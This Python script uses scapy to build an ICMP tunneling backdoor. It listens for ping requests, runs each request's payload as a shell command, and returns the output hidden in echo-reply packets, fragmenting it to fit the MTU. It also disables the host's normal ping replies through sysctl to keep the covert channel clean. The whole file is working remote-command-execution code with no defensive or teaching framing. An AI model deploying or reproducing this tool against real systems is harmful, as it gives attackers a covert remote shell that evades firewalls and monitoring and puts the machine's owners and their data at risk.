import scapy.all as scapy
import subprocess
import os
import sys
import signal
import psutil

class ICMPTunneling:
    def __init__(self):
        self.session_packet = False  # Used to start and end the tunneling session
        self.iface = scapy.conf.iface
        self.mtu = self.get_mtu()

    def get_mtu(self):
        for nic, addrs in psutil.net_if_addrs().items():
            if nic == self.iface:
                mtu = psutil.net_if_stats()[nic].mtu
                return mtu
        return 1500  # Default MTU value if not found

    def check_icmp_req(self, packet):
        if scapy.ICMP in packet and packet[scapy.ICMP].type == 8:
            self.packet_process(packet)
    
    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout or result.stderr
        except Exception as e:
            return str(e)
    
    def fragment_packet(self, packet, mtu):
        fragments = []
        payload = packet[scapy.Raw].load
        max_payload_size = mtu - len(packet[scapy.IP]) - len(packet[scapy.ICMP])
        
        while len(payload) > max_payload_size:
            fragment = payload[:max_payload_size]
            payload = payload[max_payload_size:]
            fragment_packet = packet[scapy.IP]/scapy.ICMP(type=0)/fragment
            fragments.append(fragment_packet)
        
        if payload:
            fragment_packet = packet[scapy.IP]/scapy.ICMP(type=0)/payload
            fragments.append(fragment_packet)
        
        return fragments

    def packet_process(self, packet):
        if scapy.Raw not in packet:
            if not self.session_packet:
                print("First empty command received. Starting session...")
                self.session_packet = True
                return
            elif self.session_packet:
                print("Second empty command received. Exiting session...")
                sys.exit(0)

        command = packet[scapy.Raw].load.decode()
        try:
            command_output = self.execute_command(command)
            reply_packet = scapy.IP(dst=packet[scapy.IP].src)/scapy.ICMP(type=0)/command_output
            if len(bytes(reply_packet)) > self.mtu:
                fragments = self.fragment_packet(reply_packet, self.mtu)
                for fragment in fragments:
                    scapy.send(fragment, verbose=False)
            else:
                scapy.send(reply_packet, verbose=False)
        except Exception as e:
            error_reply = scapy.IP(dst=packet[scapy.IP].src)/scapy.ICMP(type=0)/str(e)
            scapy.send(error_reply, verbose=False)

def handle_signals(signum, frame):
    os.system("sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0")
    sys.exit(0)

def main():
    # Register signal handlers
    signal.signal(signal.SIGINT, handle_signals)   # Handle Ctrl+C
    signal.signal(signal.SIGTSTP, handle_signals)  # Handle Ctrl+Z

    try:
        os.system("sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1")
        scapy.sniff(filter="icmp", prn=ICMPTunneling().check_icmp_req, store=0)
    finally:
        os.system("sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0")

if __name__ == "__main__":
    main()
